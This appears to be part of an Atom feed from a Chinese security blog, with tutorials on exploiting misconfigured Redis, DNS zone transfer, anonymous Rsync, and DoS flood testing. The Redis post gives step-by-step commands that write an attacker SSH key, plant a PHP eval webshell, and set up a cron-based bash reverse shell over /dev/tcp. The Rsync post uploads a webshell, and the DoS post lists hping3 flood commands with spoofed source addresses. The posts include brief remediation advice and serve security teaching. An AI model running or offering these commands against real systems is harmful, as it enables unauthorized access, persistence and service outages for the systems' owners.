      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之redis未授权访问</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之redis未授权访问.html</id>
    <published>2017-07-12T09:35:01.000Z</published>
    <updated>2017-07-17T07:55:42.821Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</div><div class="line">$ tar xzf redis-2.8.3.tar.gz</div><div class="line">$ cd redis-2.8.3</div><div class="line">$ make</div></pre></td></tr></table></figure></p>
<h3 id="编译完成后"><a href="#编译完成后" class="headerlink" title="编译完成后"></a>编译完成后</h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir /usr/redis</div><div class="line">cp redis-server  /usr/redis</div><div class="line">cp redis-benchmark /usr/redis</div><div class="line">cp redis-cli  /usr/redis</div><div class="line">cp redis.conf  /usr/redis</div><div class="line">cd /usr/redis</div></pre></td></tr></table></figure>
<h3 id="启动redis服务"><a href="#启动redis服务" class="headerlink" title="启动redis服务"></a>启动redis服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-server ./redis.conf</div></pre></td></tr></table></figure>
<h3 id="查看redis是否开启"><a href="#查看redis是否开启" class="headerlink" title="查看redis是否开启"></a>查看redis是否开启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ntlp | grep redis</div></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>保存到www目录，创建webshell</li>
<li>创建SSH authorized_keys文件</li>
<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
<li>slave of 8.8.8.8主从模式利用</li>
<li>写入到/etc/profile.d/用户环境变量</li>
<li>开启AOF持久化纯文本记录appendfilename</li>
</ul>
<h3 id="利用nmap获取redis信息"><a href="#利用nmap获取redis信息" class="headerlink" title="利用nmap获取redis信息"></a>利用nmap获取redis信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis1.jpg" alt=""></p>
<h3 id="利用redis客户端进行未授权访问"><a href="#利用redis客户端进行未授权访问" class="headerlink" title="利用redis客户端进行未授权访问"></a>利用redis客户端进行未授权访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div><div class="line">192.168.132.134:6379&gt; info</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis2.jpg" alt=""></p>
<p>当然，如果redis存在访问密码的话，可以使用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134 –a [password]</div></pre></td></tr></table></figure></p>
<h3 id="利用redis连接写入ssh公钥"><a href="#利用redis连接写入ssh公钥" class="headerlink" title="利用redis连接写入ssh公钥"></a>利用redis连接写入ssh公钥</h3><h4 id="在攻击机上生成ssh公钥和私钥"><a href="#在攻击机上生成ssh公钥和私钥" class="headerlink" title="在攻击机上生成ssh公钥和私钥"></a>在攻击机上生成ssh公钥和私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis3.jpg" alt=""></p>
<h4 id="将公钥写入文本"><a href="#将公钥写入文本" class="headerlink" title="将公钥写入文本"></a>将公钥写入文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~/.ssh/</div><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt</div></pre></td></tr></table></figure>
<h4 id="将1-txt写入redis"><a href="#将1-txt写入redis" class="headerlink" title="将1.txt写入redis"></a>将1.txt写入redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat 1.txt | /usr/local/redis/./redis-cli -h 192.168.132.134 -x set crack</div></pre></td></tr></table></figure>
<h4 id="利用redis客户端连接靶机redis"><a href="#利用redis客户端连接靶机redis" class="headerlink" title="利用redis客户端连接靶机redis"></a>利用redis客户端连接靶机redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div></pre></td></tr></table></figure>
<h4 id="获取redis备份的路径"><a href="#获取redis备份的路径" class="headerlink" title="获取redis备份的路径"></a>获取redis备份的路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dir</div></pre></td></tr></table></figure>
<h4 id="更改redis备份路径"><a href="#更改redis备份路径" class="headerlink" title="更改redis备份路径"></a>更改redis备份路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dir /root/.ssh</div></pre></td></tr></table></figure>
<h4 id="设置备份文件的名称为authorized-keys"><a href="#设置备份文件的名称为authorized-keys" class="headerlink" title="设置备份文件的名称为authorized_keys"></a>设置备份文件的名称为authorized_keys</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dbfilename authorized_keys</div></pre></td></tr></table></figure>
<h4 id="检查是否更改"><a href="#检查是否更改" class="headerlink" title="检查是否更改"></a>检查是否更改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</div></pre></td></tr></table></figure>
<h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; save</div></pre></td></tr></table></figure>
<h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh –i  id_rsa root@192.168.1.11</div></pre></td></tr></table></figure>
<h3 id="利用redis写入Shell"><a href="#利用redis写入Shell" class="headerlink" title="利用redis写入Shell"></a>利用redis写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.111</div></pre></td></tr></table></figure>
<h4 id="确定web服务目录"><a href="#确定web服务目录" class="headerlink" title="确定web服务目录"></a>确定web服务目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /usr/local/apache/htdocs/</div><div class="line">config set dbfilename ok.php </div><div class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
<h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli0.png" alt=""></p>
<h3 id="写计划任务来反弹shell"><a href="#写计划任务来反弹shell" class="headerlink" title="写计划任务来反弹shell"></a>写计划任务来反弹shell</h3><h4 id="telnet登录-也可以redis-cli登录"><a href="#telnet登录-也可以redis-cli登录" class="headerlink" title="telnet登录/也可以redis-cli登录"></a>telnet登录/也可以redis-cli登录</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">telnet 192.168.236.130 6379 //未授权登录</div><div class="line"></div><div class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</div><div class="line"></div><div class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</div></pre></td></tr></table></figure>
<h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.png" alt=""></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
<li>禁止使用 root 权限启动 redis 服务；</li>
<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
<li>尽可能不对公网直接开放 SSH 服务。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之DNS域传送信息泄露</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之DNS域传送信息泄露.html</id>
    <published>2017-07-12T08:17:07.000Z</published>
    <updated>2017-07-12T08:36:59.080Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Dns是整个互联网公司业务的基础，目前越来越多的互联网公司开始自己搭建DNS服务器做解析服务，同时由于DNS服务是基础性服务非常重要，因此很多公司会对DNS服务器进行主备配置而DNS主备之间的数据同步就会用到dns域传送，但如果配置不当，就会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>DNS服务器的主备数据同步，使用的是域传送功能。 域传送关键配置项为：</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<p>options配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">options &#123;  </div><div class="line">listen-on &#123; 1.1.1.1; &#125;;  </div><div class="line">listen-on-v6 &#123; any; &#125;;  </div><div class="line">directory &quot;/bind&quot;;  </div><div class="line">pid-file &quot;/bind/run/pid&quot;;  </div><div class="line">dump-file &quot;/bind/data/named_dump.db&quot;;  </div><div class="line">statistics-file &quot;/bind/data/named.stats&quot;;</div><div class="line"></div><div class="line">    allow-transfer  &#123; any; &#125;;</div><div class="line">    allow-query    &#123;any;&#125;;</div><div class="line"></div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>zone配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">zone &quot;wooyun.org&quot; &#123;  </div><div class="line">type master;  </div><div class="line">file &quot;/bind/etc/wooyun.org.conf&quot;;  </div><div class="line">allow-transfer &#123;any;&#125;;  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>笔者测试版本为BIND 9.8.2rc1-RedHat-9.8.2-0.10.rc1.el6_3.6，默认安装完毕后，配置项没有allow-transfer 项。如果直接使用默认配置文件进行配置的话（不手动添加allow-transfer项），就会存在dns 域传送漏洞。</p>
<h2 id="攻击方式及危害"><a href="#攻击方式及危害" class="headerlink" title="攻击方式及危害"></a>攻击方式及危害</h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。会导致一些非公开域名（测试域名、内部域名）泄露。而泄露的类似内部域名，其安全性相对较低，更容易遭受攻击者的攻击，比较典型的譬如内部的测试机往往就会缺乏必要的安全设置。</p>
<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><h3 id="window利用方式"><a href="#window利用方式" class="headerlink" title="window利用方式"></a>window利用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nslookup</div><div class="line">server dns.xx.com</div><div class="line">ls xx.com</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/dns.jpg" alt=""></p>
<h3 id="linux利用方式"><a href="#linux利用方式" class="headerlink" title="linux利用方式"></a>linux利用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig @dns.xx.com. axfr xx.com</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/dns2.jpg" alt=""></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-64.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-64.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之Rsync匿名访问</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之Rsync匿名访问.html</id>
    <published>2017-07-12T07:24:00.000Z</published>
    <updated>2017-07-12T08:14:11.816Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="Rsync简介"><a href="#Rsync简介" class="headerlink" title="Rsync简介"></a>Rsync简介</h2><p>Rsync，remote synchronize顾名思意就知道它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
<p>rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，这样其保密性也非常好，另外它还是免费的软件。</p>
<p>rsync 包括如下的一些特性：</p>
<ul>
<li>能更新整个目录和树和文件系统；</li>
<li>有选择性的保持符号链链、硬链接、文件属于、权限、设备以及时间等；</li>
<li>对于安装来说，无任何特殊权限要求；</li>
<li>对于多个文件来说，内部流水线减少文件等待的延时；</li>
<li>能用rsh、ssh 或直接端口做为传输入端口；</li>
<li>支持匿名rsync 同步文件，是理想的镜像工具；</li>
</ul>
<h2 id="寻找匿名访问Rsync方式"><a href="#寻找匿名访问Rsync方式" class="headerlink" title="寻找匿名访问Rsync方式"></a>寻找匿名访问Rsync方式</h2><p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -n --open -p 873 X.X.X.X/24</div></pre></td></tr></table></figure></p>
<h2 id="漏洞利用常用操作"><a href="#漏洞利用常用操作" class="headerlink" title="漏洞利用常用操作"></a>漏洞利用常用操作</h2><h3 id="例举整个同步目录或指定目录"><a href="#例举整个同步目录或指定目录" class="headerlink" title="例举整个同步目录或指定目录"></a>例举整个同步目录或指定目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync 10.0.0.12::</div><div class="line">rsync 10.0.0.12::www/</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync1.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync2.jpg" alt=""></p>
<h3 id="下载文件或目录到本地"><a href="#下载文件或目录到本地" class="headerlink" title="下载文件或目录到本地"></a>下载文件或目录到本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync -avz 10.0.0.12::www/test.php /root</div><div class="line">rsync -avz 10.0.0.12::www/ /var/tmp</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync3.jpg" alt=""></p>
<h3 id="上传本地文件到服务端"><a href="#上传本地文件到服务端" class="headerlink" title="上传本地文件到服务端"></a>上传本地文件到服务端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rsync -avz webshell.php 10.0.0.12::www/</div></pre></td></tr></table></figure>
<h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync.jpg" alt=""></p>
<h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>Metasploit中关于允许匿名访问的rsync扫描模块：<br>auxiliary/scanner/rsync/modules_list</p>
<p>针对rsync口令暴力破解的脚本rsync-brute:<br><a href="https://svn.nmap.org/nmap/scripts/rsync-brute.nse" target="_blank" rel="external">https://svn.nmap.org/nmap/scripts/rsync-brute.nse</a></p>
<h2 id="安全配置注意事项"><a href="#安全配置注意事项" class="headerlink" title="安全配置注意事项"></a>安全配置注意事项</h2><p>注意两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p>
<h3 id="限定IP的两种方式"><a href="#限定IP的两种方式" class="headerlink" title="限定IP的两种方式"></a>限定IP的两种方式</h3><p>IPTables防火墙</p>
<p>给rsync的端口添加一个iptables。</p>
<p>只希望能够从内部网络（192.168.101.0/24）访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line">iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</div></pre></td></tr></table></figure>
<p>除此之外rsyncd.conf中的hosts allow也可以设置只允许来源ip。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hosts allow = X.X.X.X #允许访问的IP</div></pre></td></tr></table></figure>
<h3 id="添加用户口令"><a href="#添加用户口令" class="headerlink" title="添加用户口令"></a>添加用户口令</h3><p>添加rsync用户权限访问，注意配置的是rsyncd.conf中的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码</div><div class="line">auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。</div></pre></td></tr></table></figure>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-161.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-161.html</a><br><a href="http://www.91ri.org/11093.html" target="_blank" rel="external">http://www.91ri.org/11093.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈ddos的测试方法</title>
    <link href="http://uknowsec.cn/posts/skill/%E6%B5%85%E8%B0%88ddos%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html"/>
    <id>http://uknowsec.cn/posts/skill/浅谈ddos的测试方法.html</id>
    <published>2017-07-12T06:22:32.000Z</published>
    <updated>2017-07-13T01:00:54.056Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>DOS（denial of service–拒绝服务）攻击的目的是使服务正常功能不可用。不像其他类型的攻击的目的是获取敏感信息，Dos攻击是不会威胁到敏感信息而是使合法用户不能使用服务。有时候Dos在其他攻击中也会存在一定的作用，比如使web应用防火墙拒绝服务，从而绕过防火墙。</p>
<h2 id="DOS与DDOS的区别"><a href="#DOS与DDOS的区别" class="headerlink" title="DOS与DDOS的区别"></a>DOS与DDOS的区别</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<h2 id="DOS的类型"><a href="#DOS的类型" class="headerlink" title="DOS的类型"></a>DOS的类型</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos.jpg" alt=""></p>
<h2 id="网络和传输层攻击"><a href="#网络和传输层攻击" class="headerlink" title="网络和传输层攻击"></a>网络和传输层攻击</h2><p>这种攻击方式通常是向服务器发送恶意流量，尽可能消耗服务器的资源来达到拒绝服务的目的。</p>
<h3 id="TCP-SYN-floods"><a href="#TCP-SYN-floods" class="headerlink" title="TCP SYN floods"></a>TCP SYN floods</h3><p>SYN洪水攻击在传输层，为了更好的理解这种类型的攻击，我们需要先了解TCP的三次握手。</p>
<p>先来看张图如下：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos1.jpg" alt=""></p>
<p>对照上图来理解一下：</p>
<p>第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</p>
<p>第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 完成了三次握手，客户端和服务器端就可以开始传送数据。</p>
<p>如果攻击者发送足够的SYN数据包，因为服务器的并发TCP连接数量有限所以会导致服务器没有更多的资源可用。 如果服务器达到限制，在现有的处于SYN-RCVD状态的连接超时之前则不能在建立新的连接，这就造成了拒绝服务攻击。</p>
<p>SYN洪水攻击测试工具，我们可以用hping3，下载地址：<a href="http://www.hping.org/hping3.html" target="_blank" rel="external">http://www.hping.org/hping3.html</a></p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 简单例子： hping3 -S --flood -V -p TARGET_PORT TARGET_SITE</div><div class="line"></div><div class="line">2 随机源IP： hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE</div></pre></td></tr></table></figure>
<h3 id="UDP-floods"><a href="#UDP-floods" class="headerlink" title="UDP floods"></a>UDP floods</h3><p>UDP协议是无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p>
<p>由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击的原理是通过伪造的IP向目标服务器发送大量的UDP数据包，服务器在接收到数据包后无法处理每一条请求，并且通过向服务器发送ICMP “destination unreachable”来消耗其带宽。</p>
<p>测试工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 hping3 命令：hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP</div><div class="line"></div><div class="line">2 loic 下载地址： https://sourceforge.net/projects/loic/</div></pre></td></tr></table></figure>
<h3 id="TCP-FIN-Flood"><a href="#TCP-FIN-Flood" class="headerlink" title="TCP FIN Flood"></a>TCP FIN Flood</h3><p>这种FIM标志的数据包只有在TCP建立连接之后才会被接受，如果没有建立TCP连接，那么这个标志的数据包将会被简单的删除处理。</p>
<p>如果攻击者只是在没有建立TCP连接的情况下对服务器进行泛洪攻击，那么FIN数据包将会别丢弃，但是服务器还是会分配一些资源来查看数据包防止冗余。</p>
<p>这种攻击很容易被实现。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="TCP-RST-Flood"><a href="#TCP-RST-Flood" class="headerlink" title="TCP RST Flood"></a>TCP RST Flood</h3><p>TCP中的RST包的意思是立即断开连接，当连接出错需要停止掉的时候非常有用。</p>
<p>如果攻击者能够以某种方式查看从源到目的地的流量，则可以发送具有适当值的RST报文（源IP，目的IP，源端口，目的端口，序列号等），该报文将断开源和目的地之间的TCP连接。 这也是一种拒绝服务的方式。</p>
<p>RST泛洪的测试工具也是hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="PUSH-and-ACK-Flood"><a href="#PUSH-and-ACK-Flood" class="headerlink" title="PUSH and ACK Flood"></a>PUSH and ACK Flood</h3><p>通过大量的PUSH和ACK泛洪可以是服务器停止对正常用户的请求进行响应。</p>
<p>测试工具：hping3 和 LOIC</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="ICMP-and-IGMP-Floods"><a href="#ICMP-and-IGMP-Floods" class="headerlink" title="ICMP and IGMP Floods"></a>ICMP and IGMP Floods</h3><p>ICMP（Internet Control Message Protocol–Internet控制消息协议）和IGMP（Internet Group Management Protocol–Internet组管理协议）是网络层的协议类似于UDP。ICMP递送状态消息，错误报告，回答某些请求，报告路由信息，并且常用于测试网络的连通性和排查问题。IGMP是IP网络上的系统和相邻路由用来建立和维护多播组成员关系的协议。</p>
